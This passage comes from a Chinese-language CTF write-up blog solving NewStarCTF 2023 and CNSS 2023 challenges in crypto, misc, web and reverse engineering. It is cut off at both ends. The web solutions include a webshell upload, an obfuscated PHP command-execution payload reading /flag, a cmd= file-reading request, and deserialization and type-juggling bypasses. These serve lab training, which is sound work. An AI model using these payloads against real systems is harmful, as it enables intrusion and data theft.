denominator, numerator = numerator, i * numerator + denominator return denominator, numerator # 得到渐进分数的分母和分子，并返回# 求解每个渐进分数def sub_fraction(x, y): res = transform(x, y) res = list(map(continued_fraction, (res[0:i] for i in range(1, len(res))))) # 将连分数的结果逐一截取以求渐进分数 return resdef get_pq(a, b, c): # 由p+q和pq的值通过维达定理来求解p和q par = gmpy2.isqrt(b * b - 4 * a * c) # 由上述可得，开根号一定是整数，因为有解 x1, x2 = (-b + par) // (2 * a), (-b - par) // (2 * a) return x1, x2def wienerAttack(e, n): for (d, k) in sub_fraction(e, n): # 用一个for循环来注意试探e/n的连续函数的渐进分数，直到找到一个满足条件的渐进分数 if k == 0: # 可能会出现连分数的第一个为0的情况，排除 continue if (e * d - 1) % k != 0: # ed=1 (mod φ(n)) 因此如果找到了d的话，(ed-1)会整除φ(n),也就是存在k使得(e*d-1)//k=φ(n) continue phi = (e * d - 1) // k # 这个结果就是 φ(n) px, qy = get_pq(1, n - phi + 1, n) if px * qy == n: p, q = abs(int(px)), abs(int(qy)) # 可能会得到两个负数，负负得正未尝不会出现 d = gmpy2.invert(e, (p - 1) * (q - 1)) # 求ed=1 (mod φ(n))的结果，也就是e关于 φ(n)的乘法逆元d return d print(&quot;该方法不适用&quot;)e = 8614531087131806536072176126608505396485998912193090420094510792595101158240453985055053653848556325011409922394711124558383619830290017950912353027270400567568622816245822324422993074690183971093882640779808546479195604743230137113293752897968332220989640710311998150108315298333817030634179487075421403617790823560886688860928133117536724977888683732478708628314857313700596522339509581915323452695136877802816003353853220986492007970183551041303875958750496892867954477510966708935358534322867404860267180294538231734184176727805289746004999969923736528783436876728104351783351879340959568183101515294393048651825n = 19873634983456087520110552277450497529248494581902299327237268030756398057752510103012336452522030173329321726779935832106030157682672262548076895370443461558851584951681093787821035488952691034250115440441807557595256984719995983158595843451037546929918777883675020571945533922321514120075488490479009468943286990002735169371404973284096869826357659027627815888558391520276866122370551115223282637855894202170474955274129276356625364663165723431215981184996513023372433862053624792195361271141451880123090158644095287045862204954829998614717677163841391272754122687961264723993880239407106030370047794145123292991433d = wienerAttack(e, n)print(&quot;d=&quot;, d) 求出d后解密flag 123456789from Crypto.Util.number import *c = 6755916696778185952300108824880341673727005249517850628424982499865744864158808968764135637141068930913626093598728925195859592078242679206690525678584698906782028671968557701271591419982370839581872779561897896707128815668722609285484978303216863236997021197576337940204757331749701872808443246927772977500576853559531421931943600185923610329322219591977644573509755483679059951426686170296018798771243136530651597181988040668586240449099412301454312937065604961224359235038190145852108473520413909014198600434679037524165523422401364208450631557380207996597981309168360160658308982745545442756884931141501387954248e = 8614531087131806536072176126608505396485998912193090420094510792595101158240453985055053653848556325011409922394711124558383619830290017950912353027270400567568622816245822324422993074690183971093882640779808546479195604743230137113293752897968332220989640710311998150108315298333817030634179487075421403617790823560886688860928133117536724977888683732478708628314857313700596522339509581915323452695136877802816003353853220986492007970183551041303875958750496892867954477510966708935358534322867404860267180294538231734184176727805289746004999969923736528783436876728104351783351879340959568183101515294393048651825n = 19873634983456087520110552277450497529248494581902299327237268030756398057752510103012336452522030173329321726779935832106030157682672262548076895370443461558851584951681093787821035488952691034250115440441807557595256984719995983158595843451037546929918777883675020571945533922321514120075488490479009468943286990002735169371404973284096869826357659027627815888558391520276866122370551115223282637855894202170474955274129276356625364663165723431215981184996513023372433862053624792195361271141451880123090158644095287045862204954829998614717677163841391272754122687961264723993880239407106030370047794145123292991433d = 2357048593flag = pow(c,d,n)print(long_to_bytes(flag)) babyxorflag按字节异或上f，需要爆破f，f的范围是一个字节0-255，把0-255按字节异或上c跑一遍就好了 12345678c = &quot;e9e3eee8f4f7bffdd0bebad0fcf6e2e2bcfbfdf6d0eee1ebd0eabbf5f6aeaeaeaeaeaef2&quot;c = bytes.fromhex(c)flag = &quot;&quot;for key in range(256): flag = bytes([b ^ key for b in c]) if b&quot;flag&quot; in flag: print(flag) Affine仿射密码，这里要求解的问题是 置反(key[0]*f + key[1]) % modulus 这个操作 可以简化成m = (c -key[1]) * key[0]的模逆，用扩欧几里得来求模逆 12345678910111213141516171819202122232425from itertools import productc = &quot;dd4388ee428bdddd5865cc66aa5887ffcca966109c66edcca920667a88312064&quot;c = bytes.fromhex(c)# 求模逆def modinv(a, m): for i in range(1, m): if (a * i) % m == 1: return i return Nonefor k0, k1 in product(range(256), repeat=2): k0_inv = modinv(k0, 256) if k0_inv is None: continue decrypted = [] for b in c: f = ((b - k1) * k0_inv) % 256 decrypted.append(f) flag = str(bytes(decrypted)) if &quot;flag&quot; in flag: print(flag) babyaeskey是由两个相同的长度16字节的字符串组成，bytes_to_long(key) ^ bytes_to_long(iv) ^ 1这里只异或了key的16字节，所以可以算出key，然后用key的低位异或可以算出iv,用iv 和key 使用aes cbc mode就能解出flag 1234567891011121314from Crypto.Cipher import AESfrom Crypto.Util.number import *xor = 3657491768215750635844958060963805125333761387746954618540958489914964573229flag = b'&gt;]\\xc1\\xe5\\x82/\\x02\\x7ft\\xf1B\\x8d\\n\\xc1\\x95i'xor = long_to_bytes(xor)key = xor[:16]*2iv = bytes_to_long(key[16:]) ^ bytes_to_long(xor[16:])iv = long_to_bytes(iv)aes = AES.new(key,AES.MODE_CBC,iv)flag = aes.decrypt(flag)print(flag) MiscCyberChef’s Secretbase32 -&gt; base58 -&gt;base64 1flag{Base_15_S0_Easy_^_^} 机密图片lsb隐写 1flag{W3lc0m3_t0_N3wSt4RCTF_2023_7cda3ece} 流量！鲨鱼！看了一下，很多无用http的数据包 用http.response.code == 200筛选后，找到这个 12345678910111213141516171819202122232425262728293031GET /1.php?cmd=base64%20/.ffffllllllll11111144444GGGGGG|base64 HTTP/1.1Host: localhostUser-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.5666.197 Safari/537.36Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2Accept-Encoding: gzip, deflate, brDNT: 1Connection: keep-aliveCookie: PHPSESSID=85usgbksv9rn85kdcsgu5j0903Upgrade-Insecure-Requests: 1Sec-Fetch-Dest: documentSec-Fetch-Mode: navigateSec-Fetch-Site: noneSec-Fetch-User: ?1sec-ch-ua-platform: &quot;Windows&quot;sec-ch-ua: &quot;Google Chrome&quot;;v=&quot;113&quot;, &quot;Chromium&quot;;v=&quot;113&quot;, &quot;Not=A?Brand&quot;;v=&quot;24&quot;sec-ch-ua-mobile: ?0HTTP/1.1 200 OKDate: Sat, 19 Aug 2023 06:20:45 GMTServer: Apache/2.4.51 (Debian)X-Powered-By: PHP/7.3.33Vary: Accept-EncodingContent-Encoding: gzipKeep-Alive: timeout=5, max=100Connection: Keep-AliveTransfer-Encoding: chunkedContent-Type: text/html; charset=UTF-8Wm14aFozdFhjbWt6TldnMGNtdGZNWE5mZFRVelpuVnNYMkkzTW1FMk1EazFNemRsTm4wSwo= 然后base64解密两次，拿到flag 1flag{Wri35h4rk_1s_u53ful_b72a609537e6} 压缩包们https://www.cnblogs.com/Hardworking666/p/15866121.html https://blog.csdn.net/q20010619/article/details/109425270 搜了一下，缺个zip头 https://blog.csdn.net/qq_29566629/article/details/122936177 加上50 4B 03 04后解压，发现结尾有一串base64编码，解密后提示密码是6位数的， 用ARCHPR破解有些问题，搜了一下装了一个Ziperello，破解后拿到flag 1flag{y0u_ar3_the_m4ter_of_z1111ppp_606a4adc} 空白格在这篇文章找到了解决方法 https://blog.csdn.net/qq_51999772/article/details/122418926 https://vii5ard.github.io/whitespace/ 运行得到flag 1flag{w3_h4v3_to0_m4ny_wh1t3_sp4ce_2a5b4e04} 隐秘的眼睛silenteye 下载这个工具，然后解密拿到flag https://www.sqlsec.com/2018/01/ctfwav.html#SilentEye https://achorein.github.io/silenteye/ 1flag{R0ck1ng_y0u_63b0dc13a591} web泄漏的秘密用dirmap 发现有个www.zip 和robot 拼接index中的flag和robots的flag后得到flag 1flag{r0bots_1s_s0_us3ful_4nd_www.zip_1s_s0_d4ng3rous} Begin of Upload有段js的代码检测上传的类型，在firefox里面把js禁用后就能上传php文件了 用一句话木马加蚁剑在根目录下找到flag 1flag{e9ed8544-e37e-4c4a-ac21-d7cacf157dbf} Begin of HTTP1234567891011121314151617POST /?ctf=1 HTTP/1.1Host: node4.buuoj.cn:2866User-Agent: NewStarCTF2023Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2Accept-Encoding: gzip, deflateContent-Type: application/x-www-form-urlencodedContent-Length: 28Origin: newstarctf.comDNT: 1Connection: closeReferer: newstarctf.comCookie: power=ctferX-Real-IP: 127.0.0.1Upgrade-Insecure-Requests: 1secret=n3wst4rCTF2023g00000d 1flag{5937a957-5910-4eec-91c3-84e1a8911d97} ErrorFlaskhttps://www.freebuf.com/articles/network/247503.html 根据提示，用空参数的时候flask就报错了，就把flag泄露出来了 1http://98e6da3a-09a5-40e7-bac4-776d4dd52435.node4.buuoj.cn:81/?number1=1&amp;number2= 1flag = &quot;flag{Y0u_@re_3enset1ve_4bout_deb8g}&quot; 报错的地方在这里，空参数的时候request.args.get会返回’’ 然后int转型就会报错 1234num1 = request.args.get(&quot;number1&quot;);num2 = request.args.get(&quot;number2&quot;);return &quot;not ssti,flag in source code~&quot;+str(int(num1)+int(num2)) Begin of PHPlevel1用0e绕过 level2传数组过去 level3传数组过去，level4加一个url编码is_numberic就识别不出来了，level5传一个符号就好了 https://blog.csdn.net/qq_46145027/article/details/124514124 https://www.cnblogs.com/zhengna/p/12342124.html https://www.cnblogs.com/Primzahl/p/6018158.html 123http://34cb9ad6-2b68-4fd9-a2fc-9a6698c8b0c5.node4.buuoj.cn:81/?key1=QNKCDZO&amp;key2=s878926199a&amp;key4[]=1&amp;key5=2024%20post: key3[]=@&amp;flag5[]=@ 1flag{3a48262b-ac99-4f09-85ed-9ac23cec050e} R!C!E!password爆破脚本 1234567891011121314151617181920212223242526272829303132333435363738394041import hashlibimport itertoolsimport stringimport threadingTARGET_PREFIX = &quot;c4d038&quot;MAX_LENGTH = 6CHARSET = string.ascii_lowercase + string.digitsTHREADS = 4def generate_strings(length): return itertools.product(CHARSET, repeat=length)def md5(s): return hashlib.md5(s.encode()).hexdigest()def check_string(start, end): for s in itertools.islice(generate_strings(MAX_LENGTH), start, end): if md5(''.join(s)).startswith(TARGET_PREFIX): print(f&quot;Found: {''.join(s)}&quot;) return ''.join(s) return Nonedef threaded_bruteforce(): total_combinations = len(CHARSET) ** MAX_LENGTH step = total_combinations // THREADS threads = [] for i in range(THREADS): start = i * step end = (i + 1) * step if i != THREADS - 1 else total_combinations t = threading.Thread(target=check_string, args=(start, end)) threads.append(t) t.start() for t in threads: t.join()if __name__ == &quot;__main__&quot;: # threaded_bruteforce() print(md5(&quot;apofox&quot;)) 非法变量名的转换 https://www.cnblogs.com/meng-han/p/16804708.html phpinfo发现可以用拼接函数的方式绕过 https://blog.csdn.net/LYJ20010728/article/details/117469219 1password=apofox&amp;e[v.a.l=(sy.(st).em)(&quot;ca&quot;.&quot;t /fla&quot;.&quot;g&quot;); EasyLogin注册个账户后登录时候有个302的包显示这个，这个是个假的 1234&lt;!-- 恭喜你找到flag --&gt;&lt;!-- flag 为下方链接中视频简介第7行开始至第10行的全部小写字母和数字 --&gt;&lt;!-- https://b23.tv/BV1SD4y1J7uY --&gt;&lt;!-- 庆祝一下吧！ --&gt; 后面尝试去爆破admin,用burp中的brute forcer然后套md5爆破，爆破出来的密码是000000，然后有个302的包里面有flag 1flag{3e7dd426-5475-4789-9605-b1fac334af0f}","link":"/2023/12/28/newstar2023-week1/"},{"title":"cnss2023","text":"Web[Baby] SignIn查看源代码，script.js文件中有一段document.getElementById(‘flag’).addEventListener(‘click’, function()下面是一段jsfuck混淆 https://enkhee-osiris.github.io/Decoder-JSFuck/ 得到flag [Baby] Backdoorpost传system()执行系统命令，找到flag [Baby] Webpackhttps://www.cnblogs.com/guowenrui/p/17023732.html 参考的这个文章 安装nodejs 用reverse-sourcemap .map文件还原找到flag [Easy] Leak.swp备份文件 vim -r还原得到flag [Easy] ezhttp传参的时候有些问题，像传host还有referer，可能是我这边安装的burp有问题，上网上查了一下发现curl也能传很多参数 1curl -X CNSS -A &quot;Mozilla/5.0 (Linux; Android 8.1.0; Redmi 5 Build/OPM1.171019.026; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/86.0.4240.99 XWEB/4313 MMWEBSDK/20220604 Mobile Safari/537.36 MMWEBID/8603 MicroMessenger/8.0.24.2180(0x28001851) WeChat/arm64 Weixin NetType/WIFI Language/zh_CN ABI/arm64&quot; -H &quot;Referer: cnss.io&quot; -H &quot;X-Forwarded-For: 127.0.0.1&quot; -H &quot;Host: uestc.edu.cn&quot; -H &quot;Content-Type: application/json&quot; -d &quot;{\\&quot;name\\&quot;: \\&quot;nyyyddddn\\&quot;,\\&quot;password\\&quot; : \\&quot;123456\\&quot;}&quot; -b &quot;name=nyyyddddn;password=123456&quot; -u nyyyddddn:123456 http://124.221.34.13:50005/Index [Easy] ezunserializefssmsl网页那显示错误是unicode里面的LRI PDI RLO的原因，在ide里面没有这种问题，传参的时候转url编码传就行了，只需要改对象数量绕过__wakeup就拿到flag了 1234567891011121314151617181920212223242526272829303132333435&lt;?phperror_reporting(0);show_source(__FILE__);include &quot;flag.php&quot;;class CNSS{ public $username = 'admin'; private $i_want2_say = '‮⁦fssmsl⁩⁦i_like_web'; protected $password = 'ctf'; function __wakeup() { $this-&gt;username = 'guest'; $this-&gt;i_want2_say = 'i_like_web'; $this-&gt;password = '123456'; echo &quot;&lt;br/&gt; wake up! &lt;br/&gt;&quot;; } function __destruct() { echo &quot;destruct&lt;br /&gt;&quot;; if ($this-&gt;username === 'admin' &amp;&amp; $this-&gt;password === 'ctf' &amp;&amp; $this-&gt;i_want2_say === '‮⁦fssmsl⁩⁦i_like_web') { //wtf global $flag; echo $flag; } else echo &quot;you are 2 baby la&lt;br/&gt;&quot;; }}$aa = new CNSS();$ss = serialize($aa);$ss=str_replace('&quot;CNSS&quot;:3','&quot;CNSS&quot;:4',$ss);echo urlencode($ss); Re[Baby] Welcome to Reverse World!main函数那，一打开就有flag了 123456789101112131415161718192021222324252627; Attributes: bp-based frame; int __cdecl main(int argc, const char **argv, const char **envp)public mainmain proc nearStr= byte ptr -40hpush rbpmov rbp, rspsub rsp, 60hcall __mainlea rax, [rbp+Str]mov rdx, raxlea rcx, Format ; &quot;%s&quot;call scanflea rax, [rbp+Str]mov rcx, rax ; Strcall strlenmov rdx, raxlea rax, [rbp+Str]mov r8, rdx ; Sizelea rdx, flag ; &quot;cnss{1t_s3ems_l1ke_Y0u_c4n_us3_IDA_n0w!&quot;...mov rcx, rax ; Buf1call memcmptest eax, eaxjnz short loc_401587 [Baby] Find me1234567891011121314151617181920212223; Attributes: bp-based frame; int __cdecl main(int argc, const char **argv, const char **envp)public mainmain proc nearpush rbpmov rbp, rspsub rsp, 20hcall __mainlea rcx, aOopsWhereIsMyF ; &quot;Oops! Where is my flag?&quot;call putslea rcx, aLearnAboutStri ; &quot;Learn about Strings and you can see the&quot;...call putslea rcx, aLearnAboutFunc ; &quot;Learn about Functions and you can see t&quot;...call putslea rcx, aLearnAboutXref ; &quot;Learn about Xref and you can see the th&quot;...call putslea rcx, aTheLastPartIsI ; &quot;The last part is _ID4_N0w!}&quot;call putsadd rsp, 20hpop rbpretnmain endp 根据提示，搜字符串cnss{ ，alt+t匹配大小写，找到第一部分cnss{W0w!Y0u’,0 查找函数，发现第二部分是函数名_Comp1et3ly_Uns7and_ 交叉引用puts找到第三部分 123456789101112131415161718192021222324252627282930313233; Attributes: bp-based framepublic sub736sub736 proc nearpush rbpmov rbp, rspsub rsp, 20hmov ecx, 68h ; 'h' ; Charactercall putcharmov ecx, 30h ; '0' ; Charactercall putcharmov ecx, 77h ; 'w' ; Charactercall putcharmov ecx, 5Fh ; '_' ; Charactercall putcharmov ecx, 74h ; 't' ; Charactercall putcharmov ecx, 30h ; '0' ; Charactercall putcharmov ecx, 5Fh ; '_' ; Charactercall putcharmov ecx, 75h ; 'u' ; Charactercall putcharmov ecx, 73h ; 's' ; Charactercall putcharmov ecx, 33h ; '3' ; Charactercall putcharlea rcx, Buffer ; &quot;Find out which function refer to me!&quot;call putsmov eax, 1BF52hadd rsp, 20hpop rbpretn 拼接获得flag cnss{W0w!Y0u_Comp1et3ly_Uns7and_h0w_t0_us3_ID4_N0w!} [Easy] 回レ! 雪月花1234567891011121314151617181920212223int __cdecl main(int argc, const char **argv, const char **envp){ int i; // [rsp+Ch] [rbp-34h] int j; // [rsp+Ch] [rbp-34h] int k; // [rsp+Ch] [rbp-34h] char v7[40]; // [rsp+10h] [rbp-30h] BYREF unsigned __int64 v8; // [rsp+38h] [rbp-8h] v8 = __readfsqword(0x28u); puts(&quot;Please input your flag:&quot;); __isoc99_scanf(&quot;%s&quot;, v7); for ( i = 0; i &lt;= 31; ++i ) v7[i] ^= 0x11u; for ( j = 0; j &lt;= 28; ++j ) encode(&amp;v7[j], &amp;v7[j + 1], &amp;v7[j + 2], &amp;v7[j + 3]); for ( k = 0; k &lt;= 31 &amp;&amp; v7[k] == cipher[k]; ++k ) ; if ( k == 32 ) puts(&quot;Correct!&quot;); else puts(&quot;Wrong!&quot;); return 0;} 这种逆向题倒过来看会很直观，分三层，把输入的字符串异或上0x11u，然后encode一遍，和cipher判断，一致获得flag 12345678910111213141516171819_BYTE *__fastcall encode(_BYTE *a1, _BYTE *a2, _BYTE *a3, _BYTE *a4){ _BYTE *result; // rax char v5; // [rsp+2Ch] [rbp-4h] char v6; // [rsp+2Dh] [rbp-3h] char v7; // [rsp+2Eh] [rbp-2h] char v8; // [rsp+2Fh] [rbp-1h] v5 = (*a1 &lt;&lt; 7) | (*a2 &gt;&gt; 1); v6 = ((*a4 &gt;&gt; 2) | (*a3 &lt;&lt; 6)) ^ v5; v7 = ((*a1 &gt;&gt; 1) | (*a2 &lt;&lt; 7)) ^ v6; v8 = ((*a3 &gt;&gt; 2) | (*a4 &lt;&lt; 6)) ^ v7; *a1 = v5; *a2 = v6; *a3 = v7; result = a4; *a4 = v8; return result;} 看了半天了不太会，去掉异或之后其他的不知道怎么做了 搜了一下发现这好像是往年题，做法是把异或去掉后，根据a1 a2 a3 a4的顺序倒着做一遍就好了 123456789101112131415161718192021222324252627#include &lt;cstdio&gt;int c[] = { 63,143,163,188,141,39,122,103,226,3,162,224, 172,234,149,139,163,237,204,182,50,140,148,82, 130,138,20,198,245,174,104,115,0};int main(){ for (int i = 28; i &gt;= 0; i--) { c[i + 3] ^= c[i + 2]; c[i + 2] ^= c[i + 1]; c[i + 1] ^= c[i + 0]; int p[4]; p[0] = ((c[i + 2] &amp; 127) &lt;&lt; 1) | (c[i] &gt;&gt; 7); p[1] = ((c[i] &amp; 127) &lt;&lt; 1) | (c[i + 2] &gt;&gt; 7); p[2] = ((c[i + 3] &amp; 63) &lt;&lt; 2) | (c[i + 1] &gt;&gt; 6); p[3] = ((c[i + 1] &amp; 63) &lt;&lt; 2) | (c[i + 3] &gt;&gt; 6); for (int j = 0; j &lt; 4; j++) c[i + j] = p[j]; } for (int i = 0; i &lt; 32; i++) putchar(c[i] ^ 17); puts(&quot;&quot;); return 0;} [Easy] 邪王真眼encode 3和4 然后还有一个alpha的索引表，应该是base64 然后替换了索引表 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253__int64 __fastcall encode(char *a1, int a2, _BYTE *a3, int *a4){ int v5; // esi int v6; // esi int v7; // esi int v8; // [rsp+30h] [rbp-20h] int v9; // [rsp+34h] [rbp-1Ch] int i; // [rsp+3Ch] [rbp-14h] int v12; // [rsp+4Ch] [rbp-4h] char *v13; // [rsp+70h] [rbp+20h] v13 = a1; if ( !a1 || !a2 ) return 0xFFFFFFFFi64; v12 = 0; if ( a2 % 3 ) v12 = 3 - a2 % 3; v9 = a2 + v12; v8 = 8 * (a2 + v12) / 6; for ( i = 0; i &lt; v9; i += 3 ) { *a3 = alpha[*v13 &gt;&gt; 2]; if ( a2 + v12 - 3 == i &amp;&amp; v12 ) { if ( v12 == 1 ) { v5 = (char)cmove_bits((unsigned __int8)*v13, 6i64, 2i64); a3[1] = alpha[v5 + (char)cmove_bits((unsigned __int8)v13[1], 0i64, 4i64)]; a3[2] = alpha[(char)cmove_bits((unsigned __int8)v13[1], 4i64, 2i64)]; a3[3] = 61; } else if ( v12 == 2 ) { a3[1] = alpha[(char)cmove_bits((unsigned __int8)*v13, 6i64, 2i64)]; a3[2] = 61; a3[3] = 61; } } else { v6 = (char)cmove_bits((unsigned __int8)*v13, 6i64, 2i64); a3[1] = alpha[v6 + (char)cmove_bits((unsigned __int8)v13[1], 0i64, 4i64)]; v7 = (char)cmove_bits((unsigned __int8)v13[1], 4i64, 2i64); a3[2] = alpha[v7 + (char)cmove_bits((unsigned __int8)v13[2], 0i64, 6i64)]; a3[3] = alpha[v13[2] &amp; 0x3F]; } a3 += 4; v13 += 3; } if ( a4 ) *a4 = v8; return 0i64;} 用这个网站http://web.chacuo.net/netbasex把alpha索引表加上去，解密UR3oWS5E0G03tRibWRrR0cEx拿到flag [Mid] 恭喜你获得了flag提现机会！ida中patch program修改然后直接call outputflag就拿到flag了 [Mid] Pyfuck12345678910x = [~((((~((~((((~(([]&lt;[]))&lt;&lt;(-~([]&lt;[])))&lt;&lt;(-~([]&lt;[])))&lt;&lt;(-~([]&lt;[]))))&lt;&lt;(-~([]&lt;[]))))&lt;&lt;(-~([]&lt;[])))&lt;&lt;(-~([]&lt;[])))&lt;&lt;(-~([]&lt;[])))),(~((~((~(((((~(([]&lt;[]))&lt;&lt;(-~([]&lt;[])))&lt;&lt;(-~([]&lt;[])))&lt;&lt;(-~([]&lt;[])))&lt;&lt;(-~([]&lt;[]))))&lt;&lt;(-~([]&lt;[]))))&lt;&lt;(-~([]&lt;[]))))&lt;&lt;(-~([]&lt;[]))),~((((~(((~(((~(([]&lt;[]))&lt;&lt;(-~([]&lt;[])))&lt;&lt;(-~([]&lt;[]))))&lt;&lt;(-~([]&lt;[])))&lt;&lt;(-~([]&lt;[]))))&lt;&lt;(-~([]&lt;[])))&lt;&lt;(-~([]&lt;[])))&lt;&lt;(-~([]&lt;[])))),~((((~(((~(((~(([]&lt;[]))&lt;&lt;(-~([]&lt;[])))&lt;&lt;(-~([]&lt;[]))))&lt;&lt;(-~([]&lt;[])))&lt;&lt;(-~([]&lt;[]))))&lt;&lt;(-~([]&lt;[])))&lt;&lt;(-~([]&lt;[])))&lt;&lt;(-~([]&lt;[])))),~(((((~((~(((~(([]&lt;[]))&lt;&lt;(-~([]&lt;[])))&lt;&lt;(-~([]&lt;[]))))&lt;&lt;(-~([]&lt;[]))))&lt;&lt;(-~([]&lt;[])))&lt;&lt;(-~([]&lt;[])))&lt;&lt;(-~([]&lt;[])))&lt;&lt;(-~([]&lt;[])))),~((~((~(((~((~(((~(([]&lt;[]))&lt;&lt;(-~([]&lt;[])))&lt;&lt;(-~([]&lt;[]))))&lt;&lt;(-~([]&lt;[]))))&lt;&lt;(-~([]&lt;[])))&lt;&lt;(-~([]&lt;[]))))&lt;&lt;(-~([]&lt;[]))))&lt;&lt;(-~([]&lt;[])))),((~((~((((-~([]&lt;[]))&lt;&lt;(-~([]&lt;[])))&lt;&lt;(-~([]&lt;[]))))&lt;&lt;(-~([]&lt;[]))))&lt;&lt;(-~([]&lt;[])))&lt;&lt;(-~([]&lt;[]))),~((~(((((~(((~(([]&lt;[]))&lt;&lt;(-~([]&lt;[])))&lt;&lt;(-~([]&lt;[]))))&lt;&lt;(-~([]&lt;[])))&lt;&lt;(-~([]&lt;[])))&lt;&lt;(-~([]&lt;[])))&lt;&lt;(-~([]&lt;[]))))&lt;&lt;(-~([]&lt;[])))),~(((~((~((~((((-~([]&lt;[]))&lt;&lt;(-~([]&lt;[])))&lt;&lt;(-~([]&lt;[]))))&lt;&lt;(-~([]&lt;[]))))&lt;&lt;(-~([]&lt;[]))))&lt;&lt;(-~([]&lt;[])))&lt;&lt;(-~([]&lt;[])))),((((((-~([]&lt;[]))&lt;&lt;(-~([]&lt;[])))&lt;&lt;(-~([]&lt;[])))&lt;&lt;(-~([]&lt;[])))&lt;&lt;(-~([]&lt;[])))&lt;&lt;(-~([]&lt;[]))),(~(((~(((~(((~(([]&lt;[]))&lt;&lt;(-~([]&lt;[])))&lt;&lt;(-~([]&lt;[]))))&lt;&lt;(-~([]&lt;[])))&lt;&lt;(-~([]&lt;[]))))&lt;&lt;(-~([]&lt;[])))&lt;&lt;(-~([]&lt;[]))))&lt;&lt;(-~([]&lt;[]))),~((~((((~((((~(([]&lt;[]))&lt;&lt;(-~([]&lt;[])))&lt;&lt;(-~([]&lt;[])))&lt;&lt;(-~([]&lt;[]))))&lt;&lt;(-~([]&lt;[])))&lt;&lt;(-~([]&lt;[])))&lt;&lt;(-~([]&lt;[]))))&lt;&lt;(-~([]&lt;[])))),~(((~((~((~((((-~([]&lt;[]))&lt;&lt;(-~([]&lt;[])))&lt;&lt;(-~([]&lt;[]))))&lt;&lt;(-~([]&lt;[]))))&lt;&lt;(-~([]&lt;[]))))&lt;&lt;(-~([]&lt;[])))&lt;&lt;(-~([]&lt;[])))),~(((~(((((-~([]&lt;[]))&lt;&lt;(-~([]&lt;[])))&lt;&lt;(-~([]&lt;[])))&lt;&lt;(-~([]&lt;[]))))&lt;&lt;(-~([]&lt;[])))&lt;&lt;(-~([]&lt;[])))),((~((((((~(([]&lt;[]))&lt;&lt;(-~([]&lt;[])))&lt;&lt;(-~([]&lt;[])))&lt;&lt;(-~([]&lt;[])))&lt;&lt;(-~([]&lt;[])))&lt;&lt;(-~([]&lt;[]))))&lt;&lt;(-~([]&lt;[])))&lt;&lt;(-~([]&lt;[]))),~((((~((((-~([]&lt;[]))&lt;&lt;(-~([]&lt;[])))&lt;&lt;(-~([]&lt;[]))))&lt;&lt;(-~([]&lt;[])))&lt;&lt;(-~([]&lt;[])))&lt;&lt;(-~([]&lt;[])))),~(((~((~((~((((-~([]&lt;[]))&lt;&lt;(-~([]&lt;[])))&lt;&lt;(-~([]&lt;[]))))&lt;&lt;(-~([]&lt;[]))))&lt;&lt;(-~([]&lt;[]))))&lt;&lt;(-~([]&lt;[])))&lt;&lt;(-~([]&lt;[])))),((~((~(((~(((~(([]&lt;[]))&lt;&lt;(-~([]&lt;[])))&lt;&lt;(-~([]&lt;[]))))&lt;&lt;(-~([]&lt;[])))&lt;&lt;(-~([]&lt;[]))))&lt;&lt;(-~([]&lt;[]))))&lt;&lt;(-~([]&lt;[])))&lt;&lt;(-~([]&lt;[]))),~((~((~(((~((~(((~(([]&lt;[]))&lt;&lt;(-~([]&lt;[])))&lt;&lt;(-~([]&lt;[]))))&lt;&lt;(-~([]&lt;[]))))&lt;&lt;(-~([]&lt;[])))&lt;&lt;(-~([]&lt;[]))))&lt;&lt;(-~([]&lt;[]))))&lt;&lt;(-~([]&lt;[])))),~(((~(((((-~([]&lt;[]))&lt;&lt;(-~([]&lt;[])))&lt;&lt;(-~([]&lt;[])))&lt;&lt;(-~([]&lt;[]))))&lt;&lt;(-~([]&lt;[])))&lt;&lt;(-~([]&lt;[])))),((~((((((~(([]&lt;[]))&lt;&lt;(-~([]&lt;[])))&lt;&lt;(-~([]&lt;[])))&lt;&lt;(-~([]&lt;[])))&lt;&lt;(-~([]&lt;[])))&lt;&lt;(-~([]&lt;[]))))&lt;&lt;(-~([]&lt;[])))&lt;&lt;(-~([]&lt;[]))),((~((~((((-~([]&lt;[]))&lt;&lt;(-~([]&lt;[])))&lt;&lt;(-~([]&lt;[]))))&lt;&lt;(-~([]&lt;[]))))&lt;&lt;(-~([]&lt;[])))&lt;&lt;(-~([]&lt;[]))),(~((~((~(((((~(([]&lt;[]))&lt;&lt;(-~([]&lt;[])))&lt;&lt;(-~([]&lt;[])))&lt;&lt;(-~([]&lt;[])))&lt;&lt;(-~([]&lt;[]))))&lt;&lt;(-~([]&lt;[]))))&lt;&lt;(-~([]&lt;[]))))&lt;&lt;(-~([]&lt;[]))),~(((~((~((~((((-~([]&lt;[]))&lt;&lt;(-~([]&lt;[])))&lt;&lt;(-~([]&lt;[]))))&lt;&lt;(-~([]&lt;[]))))&lt;&lt;(-~([]&lt;[]))))&lt;&lt;(-~([]&lt;[])))&lt;&lt;(-~([]&lt;[])))),~((~(((~(((((~(([]&lt;[]))&lt;&lt;(-~([]&lt;[])))&lt;&lt;(-~([]&lt;[])))&lt;&lt;(-~([]&lt;[])))&lt;&lt;(-~([]&lt;[]))))&lt;&lt;(-~([]&lt;[])))&lt;&lt;(-~([]&lt;[]))))&lt;&lt;(-~([]&lt;[])))),((((((-~([]&lt;[]))&lt;&lt;(-~([]&lt;[])))&lt;&lt;(-~([]&lt;[])))&lt;&lt;(-~([]&lt;[])))&lt;&lt;(-~([]&lt;[])))&lt;&lt;(-~([]&lt;[]))),~((~((~((~((~((((~(([]&lt;[]))&lt;&lt;(-~([]&lt;[])))&lt;&lt;(-~([]&lt;[])))&lt;&lt;(-~([]&lt;[]))))&lt;&lt;(-~([]&lt;[]))))&lt;&lt;(-~([]&lt;[]))))&lt;&lt;(-~([]&lt;[]))))&lt;&lt;(-~([]&lt;[])))),~(((~(((((-~([]&lt;[]))&lt;&lt;(-~([]&lt;[])))&lt;&lt;(-~([]&lt;[])))&lt;&lt;(-~([]&lt;[]))))&lt;&lt;(-~([]&l